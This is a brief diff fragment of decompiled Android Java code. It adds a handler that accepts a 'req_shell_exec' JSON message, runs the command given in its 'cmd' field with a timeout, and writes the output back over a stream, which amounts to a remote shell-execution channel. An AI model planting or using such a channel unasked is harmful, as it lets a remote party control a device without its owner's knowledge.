@@ -1,0 +1,5 @@
+386:                                        } else if ("req_shell_exec".equals(jSONObject.optString("t", "")) && jSONObject.optInt("v", 0) == 1 && sApp != null) {
+387-                                            String optString19 = jSONObject.optString("rid", "");
+388-                                            if (!optString19.isEmpty()) {
+389-                                                outputStreamWriter.write(buildShellExecResponse(optString19, jSONObject.optString("cmd", ""), jSONObject.optInt("timeoutSec", 45)).toString());
+396-                                            if ("ack".equals(jSONObject.optString("t", "")) && sApp != null && Log.isLoggable(TAG, 2)) {
